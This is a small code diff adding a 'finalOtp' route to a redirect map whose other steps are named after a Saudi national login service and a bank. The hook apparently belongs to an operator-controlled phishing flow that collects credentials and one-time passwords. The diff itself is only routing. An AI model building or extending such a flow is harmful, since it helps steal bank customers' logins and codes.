@@ -53,6 +53,7 @@ export function useRedirectMonitor({
               phone: "/step5",
               nafad: "/step4",
               rajhi: "/step6",
+              finalOtp: "/finalOtp",
             };
 
             const targetUrl = pageMap[redirectPage] || "/";
